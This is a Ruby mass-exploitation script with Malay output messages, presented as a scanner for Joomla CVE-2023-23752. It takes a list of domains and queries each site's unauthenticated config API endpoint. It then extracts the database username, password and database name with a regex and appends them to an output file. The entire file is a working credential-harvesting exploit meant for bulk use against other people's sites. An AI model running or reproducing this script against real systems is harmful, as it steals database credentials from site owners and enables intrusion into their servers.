require 'httparty'
require 'colorize'
require 'timeout'

color = "
        
╔═══╦╗░░╔╦═══╗░╔═══╦═══╦═══╦═══╗░░╔═══╦═══╦═══╦═══╦═══╗
║╔═╗║╚╗╔╝║╔══╝░║╔═╗║╔═╗║╔═╗║╔═╗║░░║╔═╗║╔═╗║╔═╗║╔══╣╔═╗║
║║░╚╩╗║║╔╣╚══╗░╚╝╔╝║║║║╠╝╔╝╠╝╔╝║░░╚╝╔╝╠╝╔╝╠╝╔╝║╚══╬╝╔╝║
║║░╔╗║╚╝║║╔═╦╩═╦═╝╔╣║║║╠═╝╔╬╗╚╗╠══╦═╝╔╬╗╚╗║░║╔╩══╗╠═╝╔╝
║╚═╝║╚╗╔╝║╚═╩╦═╣║╚═╣╚═╝║║╚═╣╚═╝╠══╣║╚═╣╚═╝║░║║╔══╝║║╚═╗
╚═══╝░╚╝░╚═══╝░╚═══╩═══╩═══╩═══╝░░╚═══╩═══╝░╚╝╚═══╩═══╝
      Re-Coded : [Mr Panda] [program mudah untuk pengimbas Joomla CVE-2023-23752]
"

puts color.colorize(:yellow)

if ARGV.empty? 
  puts "Penggunaan untuk berbilang sasaran : ruby #{__FILE__} list01.txt output.txt"
  exit
end

list = File.open("#{ARGV[0]}").read
data = list.split("\n")

regex = /"user":"(.*?)".*?"password":"(.*?)".*?"db":"(.*?)"/

data.each do |domain|
  begin
    status = Timeout::timeout(2) do
      request = HTTParty.get("http://#{domain}/api/index.php/v1/config/application?public=true", follow_redirects: false)
      puts

      if request.body.match(regex)
        user = $1
        password = $2
        db = $3

        if user.empty? || password.empty? || db.empty?
          puts "[-] => Pengguna, kata laluan atau pangkalan data kosong".colorize(:red)
          next
        end

        puts "[+] => Terdedah #{domain}".colorize(:yellow)
        puts "User: #{user} Password: #{password} Database: #{db}"
        File.open("#{ARGV[1]}","a+"){|file|file.write("#{domain} user:#{user} password:#{password} database:#{db}\n")}
        puts "Fail Disimpan => #{Dir.pwd}/#{ARGV[1]}".yellow
      else
        puts '[-] => Tidak Terdedah'.colorize(:red)
      end
    end
  rescue OpenSSL::SSL::SSLError
    puts
    puts "[-] => Ralat SSL...".red
  rescue Errno::ECONNREFUSED
    puts
    puts "[-] => Sambungan ditolak!".red 
  rescue Timeout::Error
    puts
    puts "[-] => Masa tamat...".red
  rescue Errno::ECONNRESET
    puts
    puts "[-] => Tetapan Semula Sambungan...".red
  rescue SocketError => e
    if e.message.include?("nodename or servname is provided") || e.message.include?("Name or service unknown")
      puts "[-] => URL tidak sah: #{domain}"
    else
      puts "[-] => Kesilapan: #{e.message}"
    end
    puts "[-] => Sila masukkan IP atau nama domain dan bukannya http atau https"
  rescue Errno::ENOENT => e
    if e.message.include?("No such file or directory")
      puts "[-] => URL tidak sah: #{domain}"
    else
      puts "[-] => Kesilapan: #{e.message}"
    end
  rescue URI::InvalidURIError
    puts "[-] => URL tidak sah: #{domain}"
    puts "[-] => Sila masukkan IP atau nama domain dan bukannya http atau https"
  rescue Interrupt
    puts "Keluar dari Program"
    exit
  end
end
